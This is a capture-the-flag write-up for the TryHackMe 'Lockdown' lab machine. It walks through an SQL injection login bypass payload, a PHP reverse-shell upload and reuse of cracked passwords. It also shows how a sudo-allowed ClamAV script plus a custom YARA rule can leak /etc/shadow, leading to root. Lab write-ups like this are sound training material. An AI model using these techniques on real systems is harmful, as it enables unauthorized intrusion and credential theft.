---
title: "TryHackMe - Lockdown"
author: Nasrallah
description: ""
date: 2023-06-05 00:00:00 +0000
categories : [TryHackMe]
tags: [tryhackme, linux, medium, sqli, crack, clamav, sudo, john]
img_path: /assets/img/tryhackme/lockdown
---

<div align="center"> <script src="https://tryhackme.com/badge/367641"></script> </div>

---


# **Description**

Hello hackers, I hope you are doing well. We are doing [Lockdown](https://tryhackme.com/room/lockdown) from [TryHackMe](https://tryhackme.com).

# **Enumeration**

## nmap

We start a nmap scan using the following command: `sudo nmap -sC -sV -T4 {target_IP}`.

- -sC: run all the default scripts.

- -sV: Find the version of services running on the target.

- -T4: Aggressive scan to provide faster results.

```terminal
Nmap scan report for 10.10.51.227
Host is up (0.099s latency).
Not shown: 998 filtered tcp ports (no-response)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 271dc58a0bbc02c0f0f1f55ad1ffa463 (RSA)
|   256 cef76029524f65b120020a2d0740fdbf (ECDSA)
|_  256 a5b55a4013b00fb65a5f2160716f452e (ED25519)
80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))
|_http-server-header: Apache/2.4.29 (Ubuntu)
|_http-title: Coronavirus Contact Tracer
| http-cookie-flags: 
|   /: 
|     PHPSESSID: 
|_      httponly flag not set
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

We found OpenSSH on port 22 and Apache on port 80.

## Web

Navigate to the web page.

![](1.png)

We got redirected to the domain `contacttracer.thm`, so we add it to `/etc/hosts` and refresh the page.

On the page we find a link that goes to an admin panel.

![](2.png)

It's a login page, i tried some default credentials as always but didn't work then tried `SQLi` and managed to log in `' or 1=1 -- -`.

![](3.png)

On the system_info page we see an upload form for the system logo.

![](4.png)

# **Foothold**

Let's upload a php reverse shell, setup a netcat listener and logout to the first page because that's where the logo is located at.

![](5.png)

# **Privilege Escalation**

## www-data --> cyrus

Let's now read the config file for the login page and see if we can find any passwords:

![](6.png)

I found a hash but couldn't crack it. We can also see that the config file is calling two other files located in `classes` directory.

Let's check them out.

![](7.png)

We found `mysql` credentials, let's login the service and see what we can find.

![](8.png)

We found the tables `users` and in it we find an md5 hash. Let's crack it on crackstation.net

![](9.png)

We cracked the password, now let's see if someone is using the same password:

```bash
www-data@lockdown:/home$ ls
cyrus  maxine
www-data@lockdown:/home$ su cyrus 
Password: 
cyrus@lockdown:/home$ cd
cyrus@lockdown:~$ ls
quarantine  testvirus  user.txt
```

We were able to switch to user `cyrus`

## cyrus --> maxine

Let's check our privilege with `sudo -l`

```bash
cyrus@lockdown:~$ sudo -l
[sudo] password for cyrus: 
Matching Defaults entries for cyrus on lockdown:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User cyrus may run the following commands on lockdown:
    (root) /opt/scan/scan.sh
```

There is a shell script we can run as root, let's check it.

```bash
#!/bin/bash

read -p "Enter path: " TARGET

if [[ -e "$TARGET" && -r "$TARGET" ]]
  then
    /usr/bin/clamscan "$TARGET" --copy=/home/cyrus/quarantine
    /bin/chown -R cyrus:cyrus /home/cyrus/quarantine
  else
    echo "Invalid or inaccessible path."
fi
```

This bash script prompts the user to enter a path and performs the following actions:

1. Reads the user's input and assigns it to the variable `TARGET`.
2. Checks if the file or directory specified by `TARGET` exists (`-e`) and is readable (`-r`).
3. If the path is valid and accessible, it proceeds with the following actions:
   a. Executes the `/usr/bin/clamscan` command, which is a command-line antivirus scanner. It scans the file or directory specified by `TARGET` and uses the `--copy` option to copy infected files to the `/home/cyrus/quarantine` directory.
   b. Executes the `/bin/chown` command to change the ownership of the `/home/cyrus/quarantine` directory and its contents to the user `cyrus` and the group `cyrus`.
4. If the path is invalid or inaccessible, it displays the message "Invalid or inaccessible path."

In summary, this script scans a file or directory using ClamAV antivirus (`clamscan`), moves infected files to a quarantine directory, and changes the ownership of the quarantine directory to the user `cyrus` and group `cyrus`.

Thanks to `ChatGPT` for the explanation.

I searched for ways to exploit this and found the following [article](https://exploit-notes.hdks.org/exploit/linux/privilege-escalation/sudo/sudo-clamav-privilege-escalation/) that showcases how to do so.

The way the exploitation works is we add a yara rule to `/var/lib/clamav` which is the database directory.

```js
rule test
{
    strings:
      $string = "root"
    condition:
      $string
}
```

The above rule specifies the string `root`, so if the file contains that string it is considered infected.

Let's scan the `/etc/shadow` file

![](10.png)

The file got copied to `quarantine` directory, let's read it.

![](11.png)

We got `maxine`'s hash, let's crack it.

![](12.png)

We got the password, le's switch to maxine

```bash
cyrus@lockdown:/var/lib/clamav$ su maxine
Password: 
maxine@lockdown:/var/lib/clamav$ id
uid=1000(maxine) gid=1000(maxine) groups=1000(maxine),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),108(lxd)
maxine@lockdown:~$ 
```

## maxine --> root

If we check our privilege we see we can run any command as root.

```bash
maxine@lockdown:~$ sudo -l
[sudo] password for maxine: 
Matching Defaults entries for maxine on lockdown:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User maxine may run the following commands on lockdown:
    (ALL : ALL) ALL

```
Let's run `sudo su` to become root.

```bash
axine@lockdown:~$ sudo su
root@lockdown:/home/maxine# id
uid=0(root) gid=0(root) groups=0(root)
root@lockdown:/home/maxine# 

```


---

Thank you for taking the time to read my write-up, I hope you have learned something from this. If you have any questions or comments, please feel free to reach out to me. See you in the next hack :).

---

# References
